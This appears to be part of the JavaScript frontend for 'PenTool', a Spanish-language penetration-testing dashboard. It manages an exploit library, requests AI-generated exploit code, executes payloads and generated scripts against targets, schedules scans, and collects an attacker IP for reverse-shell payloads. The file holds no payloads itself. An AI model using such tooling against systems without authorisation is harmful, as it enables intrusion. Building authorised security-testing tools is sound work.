                    <span class="log-entry-title">${escapeHtml(artifact.title || artifact.filename || `Exploit #${artifact.id}`)}</span>
                    <span class="log-entry-phase">${escapeHtml(artifact.status || 'draft')}</span>
                </div>
                <div class="exploit-meta-line">
                    <span>${escapeHtml(artifact.cve || 'Sin CVE')}</span>
                    <span>${escapeHtml(artifact.language || 'text')}</span>
                    <span>${escapeHtml(artifact.filename || 'sin archivo')}</span>
                    <span>${formatDate(artifact.updated_at)}</span>
                </div>
            `;
            entry.addEventListener('click', () => fillExploitArtifactForm(artifact));
            fragment.appendChild(entry);
        });
    });
    container.appendChild(fragment);
}

async function loadExploitLibrary() {
    try {
        const target = document.getElementById('exploit-filter-target')?.value.trim();
        const path = target ? `/exploit-library?target=${encodeURIComponent(target)}` : '/exploit-library';
        exploitLibraryCache = (await apiFetch(path)).map(normalizeExploitArtifact);
        renderExploitLibraryList(exploitLibraryCache);
    } catch (error) {
        console.error('Error loading exploit library:', error);
        showToast('No se pudo cargar la biblioteca de exploits', 'error');
    }
}

async function saveExploitArtifact(event) {
    event?.preventDefault();
    const payload = collectExploitArtifactForm();
    if (!payload.target || !payload.code) {
        showToast('Completa objetivo y código antes de guardar.', 'error');
        return;
    }
    try {
        const id = document.getElementById('exploit-artifact-id').value;
        const saved = await apiFetch(id ? `/exploit-library/${id}` : '/exploit-library', {
            method: id ? 'PUT' : 'POST',
            body: JSON.stringify(payload),
        });
        showToast('Payload guardado.', 'success');
        await loadExploitLibrary();
        fillExploitArtifactForm(saved);
    } catch (error) {
        console.error('Error saving exploit artifact:', error);
        showToast('No se pudo guardar el payload.', 'error');
    }
}

async function deleteSelectedExploitArtifact() {
    const id = document.getElementById('exploit-artifact-id').value;
    if (!id) {
        showToast('Selecciona un payload primero.', 'warning');
        return;
    }
    if (!confirm('Eliminar este payload de la biblioteca?')) return;
    try {
        await apiFetch(`/exploit-library/${id}`, { method: 'DELETE' });
        fillExploitArtifactForm(null);
        await loadExploitLibrary();
        showToast('Payload eliminado.', 'success');
    } catch (error) {
        console.error('Error deleting exploit artifact:', error);
        showToast('No se pudo eliminar el payload.', 'error');
    }
}

async function askExploitAi() {
    const prompt = document.getElementById('exploit-ai-prompt').value.trim();
    const form = collectExploitArtifactForm();
    const artifactId = document.getElementById('exploit-artifact-id').value;
    if (!form.target || !prompt) {
        showToast('Completa objetivo y pedido para la IA.', 'error');
        return;
    }
    const output = document.getElementById('exploit-ai-response');
    const copyBtn = document.getElementById('copy-ai-code-btn');
    output.textContent = 'Consultando IA...';
    if (copyBtn) copyBtn.style.display = 'none';
    try {
        const result = await apiFetch('/exploit-library/ai', {
            method: 'POST',
            body: JSON.stringify({
                target: form.target,
                prompt,
                artifact_id: artifactId ? Number(artifactId) : null,
                cve: form.cve,
                language: form.language,
            }),
        });
        pendingAiExploitCode = result.code || '';
        output.textContent = result.response || 'Sin respuesta.';
        if (pendingAiExploitCode) {
            showToast('La IA devolvió código sugerido. Puedes aplicarlo al editor.', 'success');
            if (copyBtn) copyBtn.style.display = 'inline-flex';
        }
    } catch (error) {
        console.error('Error asking exploit AI:', error);
        output.textContent = error.message || 'Error consultando IA.';
        showToast('No se pudo consultar la IA.', 'error');
    }
}

async function copyAiCode() {
    if (!pendingAiExploitCode) {
        showToast('No hay código de IA para copiar.', 'warning');
        return;
    }
    try {
        const codeToCopy = extractCodeFromResponse(pendingAiExploitCode);
        await navigator.clipboard.writeText(codeToCopy);
        showToast('Código de IA copiado al portapapeles.', 'success');
    } catch (err) {
        console.error('Error copying AI code:', err);
        showToast('Error al copiar el código.', 'error');
    }
}

async function copyEditorCode() {
    const code = document.getElementById('exploit-code')?.value || '';
    if (!code) {
        showToast('No hay código en el editor para copiar.', 'warning');
        return;
    }
    try {
        await navigator.clipboard.writeText(code);
        showToast('Código del editor copiado al portapapeles.', 'success');
    } catch (err) {
        console.error('Error copying editor code:', err);
        showToast('Error al copiar el código.', 'error');
    }
}

async function analyzeSelectedExploit() {
    const id = document.getElementById('exploit-artifact-id').value;
    if (!id) {
        showToast('Guarda o selecciona un payload para analizar.', 'warning');
        return;
    }
    const output = document.getElementById('exploit-ai-response');
    output.textContent = 'Analizando payload...';
    try {
        const result = await apiFetch(`/exploit-library/${id}/analyze`, { method: 'POST' });
        output.textContent = result.analysis || 'Sin análisis.';
    } catch (error) {
        console.error('Error analyzing exploit:', error);
        output.textContent = error.message || 'Error analizando payload.';
    }
}

async function runSelectedExploitArtifact() {
    const id = document.getElementById('exploit-artifact-id').value;
    if (!id) {
        showToast('Selecciona y guarda un payload antes de ejecutar.', 'warning');
        return;
    }
    if (!confirm('Ejecutar este payload contra el objetivo autorizado?')) return;
    const output = document.getElementById('exploit-run-output');
    output.textContent = 'Ejecutando payload...';
    try {
        const result = await apiFetch(`/exploit-library/${id}/run`, {
            method: 'POST',
            body: JSON.stringify({ args: document.getElementById('exploit-run-args').value.trim() }),
        });
        output.textContent = `Comando:\n${result.command}\n\nSalida:\n${result.output || 'Sin salida.'}`;
        await loadExploitLibrary();
    } catch (error) {
        console.error('Error running exploit artifact:', error);
        output.textContent = error.message || 'Error ejecutando payload.';
        showToast('No se pudo ejecutar el payload.', 'error');
    }
}

// ============================================
// GENERATED CODE (from chat, tools, etc.)
// ============================================

async function loadGeneratedCode() {
    try {
        const data = await apiFetch('/api/code/list');
        renderGeneratedCode(data.files || []);
    } catch { /* silent */ }
}

function renderGeneratedCode(files) {
    const el = document.getElementById('generated-code-list');
    if (!el) return;
    if (!files || files.length === 0) {
        el.innerHTML = '<div class="empty-state"><i class="fas fa-code"></i><p>Sin código generado aún</p><small>Guarda código desde el chat IA o herramientas</small></div>';
        return;
    }
    el.innerHTML = files.map(f => {
        const name = f.filename || 'unknown';
        const size = f.size ? `${(f.size / 1024).toFixed(1)} KB` : '';
        const modified = f.modified ? new Date(f.modified).toLocaleString() : '';
        return `<div class="exploit-item" onclick="loadGeneratedCodeFile('${name}')">
            <div class="exploit-item-info">
                <strong>${escapeHtml(name)}</strong>
                <small>${size} ${modified}</small>
            </div>
            <div class="exploit-item-actions">
                <button class="btn btn-sm btn-secondary" onclick="event.stopPropagation();loadGeneratedCodeFile('${name}')" title="Editar"><i class="fas fa-edit"></i></button>
                <button class="btn btn-sm btn-primary" onclick="event.stopPropagation();execGeneratedCode('${name}')" title="Ejecutar"><i class="fas fa-play"></i></button>
                <button class="btn btn-sm btn-danger" onclick="event.stopPropagation();deleteGeneratedCode('${name}')" title="Eliminar"><i class="fas fa-trash"></i></button>
            </div>
        </div>`;
    }).join('');
}

async function loadGeneratedCodeFile(filename) {
    try {
        const data = await apiFetch(`/api/code/read/${encodeURIComponent(filename)}`);
        document.getElementById('exploit-filename').value = data.filename;
        document.getElementById('exploit-code').value = data.code;
        document.getElementById('exploit-artifact-id').value = '';
        document.getElementById('exploit-target').value = '';
        document.getElementById('exploit-cve').value = '';
        document.getElementById('exploit-title').value = filename;
        // Auto-detect language
        const ext = filename.split('.').pop().toLowerCase();
        const langMap = { py: 'python', sh: 'bash', rb: 'ruby', pl: 'perl', php: 'php', js: 'javascript', ps1: 'powershell' };
        const langSelect = document.getElementById('exploit-language');
        if (langMap[ext] && [...langSelect.options].some(o => o.value === langMap[ext])) {
            langSelect.value = langMap[ext];
        }
        showToast(`Cargado: ${filename}`, 'success');
    } catch (err) {
        showToast(`Error: ${err.message}`, 'error');
    }
}

async function execGeneratedCode(filename) {
    const args = document.getElementById('exploit-run-args')?.value || '';
    const output = document.getElementById('exploit-run-output');
    if (!output) return;
    output.textContent = `Ejecutando ${filename}...\n`;
    try {
        const result = await apiFetch('/api/code/exec', {
            method: 'POST',
            body: JSON.stringify({ filename, args }),
        });
        const lines = [
            `$ python ${filename} ${args}`,
            '',
            result.stdout || '',
            result.stderr ? `\n[STDERR]\n${result.stderr}` : '',
            `\n[Salida: ${result.returncode === 0 ? 'OK' : 'Error (' + result.returncode + ')'}]`,
        ];
        output.textContent = lines.join('\n');
    } catch (err) {
        output.textContent = `Error: ${err.message}`;
    }
}

async function deleteGeneratedCode(filename) {
    if (!confirm(`¿Eliminar ${filename}?`)) return;
    try {
        await apiFetch(`/api/code/delete/${encodeURIComponent(filename)}`, { method: 'DELETE' });
        showToast('Archivo eliminado', 'success');
        loadGeneratedCode();
    } catch (err) {
        showToast(`Error: ${err.message}`, 'error');
    }
}

function formatScheduleStatus(status) {
    if (!status) return 'Pendiente';
    const normalized = String(status || '').toLowerCase();
    if (normalized.includes('running')) return 'En Ejecución';
    if (normalized.includes('triggered')) return 'Ejecutado';
    if (normalized.includes('scheduled')) return 'Programado';
    return status;
}

function renderAuditLogList(logs) {
    const container = document.getElementById('audit-log-list');
    if (!container) return;
    container.innerHTML = '';
    if (!Array.isArray(logs) || logs.length === 0) {
        container.innerHTML = `<div class="empty-state"><i class="fas fa-inbox"></i><p>No hay eventos de auditoría</p></div>`;
        return;
    }

    const fragment = document.createDocumentFragment();
    logs.forEach((log) => {
        const entry = document.createElement('div');
        entry.className = 'log-entry';
        entry.innerHTML = `
            <div class="log-entry-header">
                <span class="log-entry-title">${escapeHtml(log.event_type || 'Evento')}</span>
                <span class="log-entry-phase">${formatDate(log.event_time)} - ${escapeHtml(log.actor || 'sistema')}</span>
            </div>
            <pre>${escapeHtml(log.details || '')}</pre>
        `;
        fragment.appendChild(entry);
    });
    container.appendChild(fragment);
}

function renderScheduledScansList(schedules) {
    const container = document.getElementById('scheduled-scans-list');
    if (!container) return;
    container.innerHTML = '';
    if (!Array.isArray(schedules) || schedules.length === 0) {
        container.innerHTML = `<div class="empty-state"><i class="fas fa-inbox"></i><p>No hay escaneos programados</p></div>`;
        return;
    }

    const fragment = document.createDocumentFragment();
    schedules.forEach((schedule) => {
        const card = document.createElement('div');
        card.className = 'scan-item';
        card.innerHTML = `
            <div class="scan-item-header">
                <span class="scan-target">${escapeHtml(schedule.target)}</span>
                <span class="scan-status ${schedule.enabled ? 'medium' : 'low'}">${formatScheduleStatus(schedule.status)}</span>
            </div>
            <div>
                <p style="margin: 0.5rem 0; font-size: 0.9rem; color: var(--text-secondary);">
                    <strong>Tipo:</strong> ${escapeHtml(schedule.scan_type || 'standard')} | <strong>Intensidad:</strong> ${escapeHtml(schedule.intensity || 'medium')}
                </p>
                <p style="margin: 0; font-size: 0.85rem; color: var(--text-secondary);">
                    <strong>Programado para:</strong> ${formatDate(schedule.schedule_at)}
                </p>
            </div>
            <div class="settings-actions" style="margin-top: 0.8rem;">
                <button type="button" class="btn btn-secondary" data-run-schedule="${schedule.id}"><i class="fas fa-play"></i> Ejecutar ahora</button>
                <button type="button" class="btn btn-danger" data-delete-schedule="${schedule.id}"><i class="fas fa-trash"></i> Eliminar</button>
            </div>
        `;
        card.querySelector('[data-run-schedule]')?.addEventListener('click', () => runScheduleNow(schedule.id));
        card.querySelector('[data-delete-schedule]')?.addEventListener('click', () => deleteScheduledScan(schedule.id));
        fragment.appendChild(card);
    });
    container.appendChild(fragment);
}

async function loadScheduledScans() {
    try {
        const schedules = await apiFetch('/schedule');
        renderScheduledScansList(schedules);
    } catch (error) {
        console.error('Error loading scheduled scans:', error);
    }
}

async function loadAuditLogs() {
    try {
        const logs = await apiFetch('/audit');
        renderAuditLogList(logs);
    } catch (error) {
        console.error('Error loading audit logs:', error);
    }
}

async function createSchedule(event) {
    event.preventDefault();
    const target = document.getElementById('schedule-target').value.trim();
    const scanType = document.getElementById('schedule-scan-type').value;
    const intensity = document.getElementById('schedule-intensity').value;
    const scheduleAtValue = document.getElementById('schedule-at').value;
    const enabled = document.getElementById('schedule-enabled').checked;

    if (!target || !scheduleAtValue) {
        showToast('Completa el objetivo y la fecha de programación.', 'error');
        return;
    }

    try {
        const scheduleAtIso = new Date(scheduleAtValue).toISOString();
        await apiFetch('/schedule', {
            method: 'POST',
            body: JSON.stringify({
                target,
                scan_type: scanType,
                intensity,
                options: {},
                schedule_at: scheduleAtIso,
                enabled,
            }),
        });
        showToast('Escaneo programado correctamente.', 'success');
        document.getElementById('schedule-form').reset();
        loadScheduledScans();
        loadAuditLogs();
    } catch (error) {
        console.error('Error creating schedule:', error);
        showToast('No se pudo programar el escaneo.', 'error');
    }
}

async function runScheduleNow(scheduleId) {
    try {
        await apiFetch(`/schedule/${scheduleId}/run`, { method: 'POST' });
        showToast('Programa ejecutado manualmente.', 'success');
        loadScheduledScans();
        loadAuditLogs();
    } catch (error) {
        console.error('Error running schedule:', error);
        showToast('No se pudo ejecutar el programa.', 'error');
    }
}

async function deleteScheduledScan(scheduleId) {
    if (!confirm('Eliminar esta programación de escaneo?')) return;

    try {
        await apiFetch(`/schedule/${scheduleId}`, { method: 'DELETE' });
        showToast('Programación eliminada.', 'success');
        loadScheduledScans();
        loadAuditLogs();
    } catch (error) {
        console.error('Error deleting schedule:', error);
        showToast('No se pudo eliminar la programación.', 'error');
    }
}

function updateStatistics() {
    const totalVulns = latestVulnsCache.length;
    const criticalCount = latestVulnsCache.filter((v) => normalizeSeverityLabel(v.severity) === 'critical').length;
    const highCount = latestVulnsCache.filter((v) => normalizeSeverityLabel(v.severity) === 'high').length;
    const mediumCount = latestVulnsCache.filter((v) => normalizeSeverityLabel(v.severity) === 'medium').length;
    const lowCount = latestVulnsCache.filter((v) => normalizeSeverityLabel(v.severity) === 'low').length;
    const exploitedCount = latestExploitsCache.filter((e) => e.result && e.result.toLowerCase().includes('success')).length;
    const activeCount = latestScansCache.filter((scan) => ['running', 'queued', 'paused'].includes(normalizeStatusLabel(scan.status))).length;

    setTextContent('#total-vulns', String(totalVulns));
    setTextContent('#critical-vulns', String(criticalCount));
    setTextContent('#high-vulns', String(highCount));
    setTextContent('#active-scans', String(activeCount));
    setTextContent('#exploited-vulns', String(exploitedCount));
    setTextContent('#total-scans', String(latestScansCache.length));
    setTextContent('.vuln-item.critical .vuln-count', String(criticalCount));
    setTextContent('.vuln-item.high .vuln-count', String(highCount));
    setTextContent('.vuln-item.medium .vuln-count', String(mediumCount));
    setTextContent('.vuln-item.low .vuln-count', String(lowCount));

    if (threatChart) {
        threatChart.data.datasets[0].data = [criticalCount, highCount, mediumCount, lowCount];
        threatChart.update();
    }
}

function initThreatChart() {
    const ctx = document.getElementById('threat-chart');
    if (!ctx) return;
    threatChart = new Chart(ctx, {
        type: 'doughnut',
        data: {
            labels: ['Criticas', 'Altas', 'Medias', 'Bajas'],
            datasets: [{
                data: [0, 0, 0, 0],
                backgroundColor: ['#dc2626', '#f97316', '#f59e0b', '#16a34a'],
                borderColor: '#ffffff',
                borderWidth: 3,
            }],
        },
        options: {
            responsive: true,
            maintainAspectRatio: true,
            plugins: {
                legend: {
                    position: 'bottom',
                    labels: {
                        color: '#526176',
                        padding: 16,
                        usePointStyle: true,
                        pointStyle: 'circle',
                        font: { size: 12, weight: '600' },
                    },
                },
            },
        },
    });
}

async function exploitVulnerability(vuln) {
    const resultContainer = document.getElementById('vuln-exploit-result');
    const exploitButton = document.getElementById('vuln-exploit-btn');
    if (!resultContainer || !exploitButton) return;

    if (!apiToken && !(await authenticate())) {
        showToast('Debes autenticarte antes de validar una vulnerabilidad', 'error');
        return;
    }

    exploitButton.disabled = true;
    const originalText = exploitButton.textContent;
    exploitButton.textContent = 'Validando...';
    let startTime = Date.now();
    let progressInterval = null;
    
    resultContainer.innerHTML = `<div style="color: var(--text-secondary); text-align: center; padding: 1rem;">
        <i class="fas fa-hourglass-half fa-spin"></i>
        <div style="margin-top: 0.5rem;">
            <strong>Procesando...</strong>
            <div style="font-size: 0.85rem; margin-top: 0.3rem;">
                Buscando módulo verificado
                <br/>
                <span id="exploit-timer">0s</span>
            </div>
        </div>
    </div>`;

    progressInterval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const timerEl = document.getElementById('exploit-timer');
        if (timerEl) {
            timerEl.textContent = `${elapsed}s (esperando respuesta del modelo IA...)`;
        }
    }, 1000);

    try {
        const attackerIpInput = document.getElementById('vuln-modal-attacker-ip');
        const attackerIp = attackerIpInput ? attackerIpInput.value.trim() : '';
        
        const payload = {
            scan_id: currentScanData?.scan_id || vuln.scan_id || undefined,
            user: currentScanData?.user || undefined,
            password: currentScanData?.password || undefined,
            attacker_ip: attackerIp || undefined,
        };

        const result = await apiFetch(`/vulnerabilities/${vuln.id}/exploit`, {
            method: 'POST',
            body: JSON.stringify(payload),
        });

        const wasExecuted = result.status === 'executed' || result.exploit?.result === 'executed';
        const statusText = wasExecuted ? 'Ejecutado con modulo verificado' : 'No ejecutado automaticamente';
        const statusColor = wasExecuted ? '#00d084' : '#ffaa00';
        const command = cleanDisplayText(result.command || result.exploit?.payload || '');
        const notes = cleanDisplayText(result.exploit?.notes || '');
        const output = cleanDisplayText(result.output || 'Sin salida disponible');

        resultContainer.innerHTML = `
            <div class="exploit-result-card" style="display: grid; gap: 1rem;">
                <div style="border-left: 3px solid var(--accent); padding-left: 1rem;">
                    <div><strong>Objetivo:</strong> ${escapeHtml(result.target || vulnTargetLabel(vuln))}</div>
                    <div><strong>Vulnerabilidad:</strong> ${escapeHtml(result.vulnerability?.name || vuln.vuln_name || 'Desconocida')}</div>
                    <div><strong>Severidad:</strong> <span class="scan-status ${normalizeSeverityLabel(result.vulnerability?.severity || vuln.severity)}">${escapeHtml(String(result.vulnerability?.severity || vuln.severity).toUpperCase())}</span></div>
                </div>

                <div style="border-left: 3px solid ${statusColor}; padding-left: 1rem;">
                    <div><strong>Estado:</strong> <span style="color:${statusColor}; font-weight: 700;">${statusText}</span></div>
                    <div><strong>Modulo:</strong> ${escapeHtml(result.exploit?.name || 'No disponible')}</div>
                    <div><strong>Herramienta:</strong> ${escapeHtml(result.exploit?.tool || 'manual_review')}</div>
                </div>

                ${command ? `<div style="border-left: 3px solid #ff4444; padding-left: 1rem;">
                    <strong><i class="fas fa-terminal"></i> Comando validado:</strong>
                    <pre style="white-space: pre-wrap; word-break: break-word;">${escapeHtml(command)}</pre>
                </div>` : ''}

                <div style="border-left: 3px solid var(--accent); padding-left: 1rem;">
                    <strong><i class="fas fa-list-check"></i> Resultado:</strong>
                    <pre style="white-space: pre-wrap; word-break: break-word; max-height: 240px; overflow-y: auto;">${escapeHtml(output)}</pre>
                </div>

                ${notes ? `<div style="border-left: 3px solid #00d084; padding-left: 1rem;">
                    <strong><i class="fas fa-info-circle"></i> Nota operativa:</strong>
                    <p style="margin: 0.4rem 0 0; font-size: 0.9rem; white-space: pre-wrap;">${escapeHtml(notes)}</p>
                </div>` : ''}
            </div>
        `;

        showToast(wasExecuted ? 'Validacion ejecutada.' : 'No hay explotacion automatica verificada para este caso.', wasExecuted ? 'success' : 'warning');
        await loadLatestExploits();
        if (currentScanData && result.scan_id === currentScanData.scan_id) {
            await fetchActiveScan();
        }
    } catch (error) {
        console.error('Error validando vulnerabilidad:', error);
        const errorMsg = error.message || 'No se pudo validar.';
        const isTimeout = errorMsg.includes('timeout') || errorMsg.includes('timed out');
        resultContainer.innerHTML = `<div style="color: #ff4444; padding: 1rem; background: rgba(255,68,68,0.1); border-radius: 0.5rem;">
            <i class="fas fa-exclamation-circle"></i> 
            <strong>${isTimeout ? 'Timeout' : 'Error'}:</strong> 
            ${escapeHtml(errorMsg)}
            ${isTimeout ? '<div style="font-size: 0.85rem; margin-top: 0.5rem;">El modelo IA tardó demasiado. Intenta con una vulnerabilidad diferente o verifica la configuración del modelo.</div>' : ''}
        </div>`;
        showToast('Error al validar la vulnerabilidad', 'error');
    } finally {
        if (progressInterval) clearInterval(progressInterval);
        exploitButton.disabled = false;
        exploitButton.textContent = originalText;
    }
}


async function loadScanVulnerabilities(scanId, slNo) {
    try {
        const vulns = (await apiFetch(`/vulnerabilities?scan_id=${scanId}`)).map(normalizeVuln)
            .sort((a, b) => severityRank(a.severity) - severityRank(b.severity));
        
        const vulnsList = document.getElementById('scan-vulnerabilities-list');
        const vulnBadge = document.getElementById('vuln-count-badge');
        if (!vulnsList) return;
        
        if (vulns.length === 0) {
            vulnsList.innerHTML = `<div class="empty-state"><i class="fas fa-shield-check"></i><p>Sin vulnerabilidades detectadas en esta sesión</p></div>`;
            if (vulnBadge) { vulnBadge.textContent = '0'; vulnBadge.style.display = 'inline-flex'; }
            return;
        }

        if (vulnBadge) { vulnBadge.textContent = vulns.length; vulnBadge.style.display = 'inline-flex'; }

        const fragment = document.createDocumentFragment();
        vulns.forEach((vuln) => {
            const severity = normalizeSeverityLabel(vuln.severity);
            const vulnEl = document.createElement('div');
            vulnEl.className = 'vuln-item-card';
            vulnEl.innerHTML = `
                <div class="scan-item-header">
                    <span class="scan-target">${escapeHtml(vuln.vuln_name)}</span>
                    <span class="scan-status ${severity}">${severity.toUpperCase()}</span>
                </div>
                <div>
                    <p style="margin: 0.45rem 0; font-size: 0.9rem; color: var(--accent);">
                        <strong>Objetivo:</strong> ${escapeHtml(vulnTargetLabel(vuln))}
                    </p>
                    <p style="margin: 0.5rem 0; font-size: 0.9rem; color: var(--text-secondary);">
                        <strong>Puerto:</strong> ${escapeHtml(vuln.port || 'N/A')} | <strong>Servicio:</strong> ${escapeHtml(vuln.service || 'N/A')}
                    </p>
                    <p style="margin: 0; font-size: 0.85rem; color: var(--text-secondary);">${escapeHtml(cleanDisplayText(vuln.description) || 'Sin descripcion')}</p>
                </div>
                <div class="settings-actions" style="margin-top: 0.8rem;">
                    <button type="button" class="btn btn-primary" data-exploit-vuln-session="${vuln.id}">
                        <i class="fas fa-rocket"></i> Explotar Ahora
                    </button>
                </div>
            `;
            
            vulnEl.querySelector(`[data-exploit-vuln-session="${vuln.id}"]`)?.addEventListener('click', () => {
                showVulnerabilityExploitModal(vuln);
            });
            
            fragment.appendChild(vulnEl);
        });
        vulnsList.appendChild(fragment);
    } catch (error) {
        console.error('Error loading scan vulnerabilities:', error);
    }
}

function showVulnerabilityExploitModal(vuln) {
    const modal = document.getElementById('vuln-modal');
    const modalBody = document.getElementById('vuln-modal-body');
    const severityClass = normalizeSeverityLabel(vuln.severity);
    const savedAttackerIp = document.getElementById('attacker-ip-input')?.value || '';
    
    modalBody.innerHTML = `
        <h2>${escapeHtml(vuln.vuln_name)}</h2>
        <div style="margin-bottom: 1rem;">
            <span class="scan-status ${severityClass}">${escapeHtml(String(vuln.severity || 'UNKNOWN').toUpperCase())}</span>
        </div>
        <div class="scan-details" style="display: grid; gap: 0.8rem;">
            <div><strong>Objetivo:</strong> ${escapeHtml(vulnTargetLabel(vuln))}</div>
            <div><strong>Puerto:</strong> ${escapeHtml(vuln.port || 'N/A')}</div>
            <div><strong>Servicio:</strong> ${escapeHtml(vuln.service || 'N/A')}</div>
            <div><strong>Descripcion:</strong><p>${escapeHtml(cleanDisplayText(vuln.description) || 'Sin descripcion disponible')}</p></div>
            <div><strong>Remediacion:</strong><p>${escapeHtml(cleanDisplayText(vuln.fix) || 'Sin remediacion disponible')}</p></div>
        </div>
        <div style="margin-top: 1rem; padding: 0.75rem; background: rgba(0, 200, 136, 0.1); border: 1px solid rgba(0, 200, 136, 0.3); border-radius: 0.5rem;">
            <label style="display: block; margin-bottom: 0.5rem;"><strong><i class="fas fa-network-wired"></i> IP del Atacante (LHOST)</strong></label>
            <input type="text" id="vuln-modal-attacker-ip" class="form-input" placeholder="Ej: 192.168.1.100" value="${escapeHtml(savedAttackerIp)}" style="width: 100%;">
            <small style="display: block; margin-top: 0.35rem; color: var(--text-secondary);">Usa esta IP para payloads con reverse shell o conexiones al atacante</small>
        </div>
        <div class="modal-actions" style="margin-top: 1rem;">
            <button type="button" id="vuln-exploit-btn" class="btn btn-primary">Validar / explotar con modulo verificado</button>
        </div>
        <div id="vuln-exploit-result" style="margin-top: 1rem; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.08); padding: 0.85rem; border-radius: 0.75rem; color: var(--text); font-size: 0.9rem; min-height: 80px;">PenTool solo ejecutara modulos verificados. Si no existe uno para esta vulnerabilidad, mostrara una nota operativa sin simular resultados.</div>
    `;

    const exploitButton = modalBody.querySelector('#vuln-exploit-btn');
    if (exploitButton) {
        exploitButton.addEventListener('click', () => exploitVulnerability(vuln));
    }
    modal.classList.add('active');
}

// Alias for backwards compatibility
function viewVulnerabilityDetails(vuln) {
    showVulnerabilityExploitModal(vuln);
}

function setupModalHandlers() {
    // Vulnerability modal
    const vulnModal = document.getElementById('vuln-modal');
    if (vulnModal) {
        const vulnModalClose = vulnModal.querySelector('.modal-close');
        if (vulnModalClose) {
            vulnModalClose.addEventListener('click', () => vulnModal.classList.remove('active'));
        }
        vulnModal.addEventListener('click', (e) => {
            if (e.target === vulnModal) vulnModal.classList.remove('active');
        });
    }

    // Sudo password modal
    const sudoModal = document.getElementById('sudo-modal');
    if (sudoModal) {
        const sudoModalClose = sudoModal.querySelector('.modal-close');
        if (sudoModalClose) {
            sudoModalClose.addEventListener('click', () => sudoModal.classList.remove('active'));
        }
        sudoModal.addEventListener('click', (e) => {
            if (e.target === sudoModal) sudoModal.classList.remove('active');
        });
    } else {
        console.error('Sudo modal not found in DOM');
    }

    // ESC key handler for all modals
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            if (vulnModal) vulnModal.classList.remove('active');
            if (sudoModal) sudoModal.classList.remove('active');
        }
    });
}

function setupNavigation() {
    document.querySelectorAll('.nav-link').forEach((link) => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            showSection(link.getAttribute('data-section'));
        });
    });
    document.querySelectorAll('[data-command-section]').forEach((button) => {
        button.addEventListener('click', () => {
            showSection(button.dataset.commandSection);
            document.getElementById('command-modal')?.classList.remove('active');
        });
    });
}

function setupCommandPalette() {
    const modal = document.getElementById('command-modal');
    const trigger = document.getElementById('command-palette-btn');
    const input = document.getElementById('command-search-input');
    if (!modal || !trigger || !input) return;

    const openPalette = () => {
        modal.classList.add('active');
        input.value = '';
        modal.querySelectorAll('.command-item').forEach((item) => { item.style.display = 'grid'; });
        window.setTimeout(() => input.focus(), 0);
    };
    const closePalette = () => modal.classList.remove('active');

    trigger.addEventListener('click', openPalette);
    modal.addEventListener('click', (event) => {
        if (event.target === modal) closePalette();
    });
    input.addEventListener('input', () => {
        const query = input.value.trim().toLowerCase();
        modal.querySelectorAll('.command-item').forEach((item) => {
            item.style.display = item.textContent.toLowerCase().includes(query) ? 'grid' : 'none';
        });
    });
    document.addEventListener('keydown', (event) => {
        if ((event.ctrlKey || event.metaKey) && event.key.toLowerCase() === 'k') {
            event.preventDefault();
            modal.classList.contains('active') ? closePalette() : openPalette();
        }
        if (event.key === 'Escape') closePalette();
    });
}

function setupFormHandlers() {
    document.getElementById('quick-scan-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        const target = document.getElementById('target-input').value.trim();
        if (target) {
            await startScan(target, 'dashboard');
            e.target.reset();
        }
    });

    document.getElementById('full-scan-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const target = String(formData.get('target') || '').trim();
        if (target) {
            await startScan(target, 'full', {
                scan_type: String(formData.get('scan-type') || 'standard'),
                intensity: String(formData.get('intensity') || 'medium'),
                options: {
                    dns_enum: formData.has('dns-enum'),
                    service_detect: formData.has('service-detect'),
                    web_crawl: formData.has('web-crawl'),
                    nikto: formData.has('nikto'),
                },
            });
        }
    });

    // Rescan button - go back to new scan section
    const rescanBtn = document.getElementById('rescan-btn');
    if (rescanBtn) {
        rescanBtn.addEventListener('click', () => showSection('scan'));
    }

    // Live summary updater for scan config
    const scanTypeLabels = { quick: 'Rápido (5 min)', standard: 'Estándar (15 min)', deep: 'Profundo (30+ min)', custom: 'Personalizado' };
    const intensityLabels = { low: 'Baja', medium: 'Media', high: 'Alta' };
    function updateScanSummary() {
        const form = document.getElementById('full-scan-form');
        if (!form) return;
        const fd = new FormData(form);
        const st = document.getElementById('summary-scan-type');
        const si = document.getElementById('summary-intensity');
        const sm = document.getElementById('summary-modules');
        if (st) st.textContent = scanTypeLabels[fd.get('scan-type')] || 'Estándar (15 min)';
        if (si) si.textContent = intensityLabels[fd.get('intensity')] || 'Media';
        if (sm) {
            const checks = form.querySelectorAll('input[type="checkbox"]');
            const checked = form.querySelectorAll('input[type="checkbox"]:checked').length;
            sm.textContent = `${checked} / ${checks.length}`;
        }
    }
    const scanForm = document.getElementById('full-scan-form');
    if (scanForm) {
        scanForm.addEventListener('change', updateScanSummary);
        setTimeout(updateScanSummary, 100);
    }

    document.getElementById('settings-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        savePenToolApiKey(document.getElementById('api-key-input').value.trim());
        if (!(await authenticate())) return;
        await saveLlmSettings();
    });

    const scheduleForm = document.getElementById('schedule-form');
    if (scheduleForm) {
        scheduleForm.addEventListener('submit', createSchedule);
    }

    document.getElementById('show-api-key').addEventListener('click', () => {
        const input = document.getElementById('api-key-input');
        input.type = input.type === 'password' ? 'text' : 'password';
    });

    document.getElementById('show-llm-api-key')?.addEventListener('click', () => {
        const input = document.getElementById('llm-api-key');
        input.type = input.type === 'password' ? 'text' : 'password';
    });

    document.getElementById('llm-provider')?.addEventListener('change', (event) => {
        applyProviderSelection(event.target.value, true);
    });

    ['llm-temperature', 'llm-top-p'].forEach((id) => {
        document.getElementById(id)?.addEventListener('input', syncTuningOutputs);
    });

    document.getElementById('refresh-models-btn').addEventListener('click', async () => {
        savePenToolApiKey(document.getElementById('api-key-input').value.trim());
        if (!apiToken && !(await authenticate())) return;
        await refreshAvailableModels(document.getElementById('llm-model-input').value.trim());
    });

    document.getElementById('test-llm-btn').addEventListener('click', async () => {
        savePenToolApiKey(document.getElementById('api-key-input').value.trim());
        if (!apiToken && !(await authenticate())) return;
        await testLlmConnection();
    });

    document.getElementById('refresh-system-health')?.addEventListener('click', () => loadSystemHealth(true));
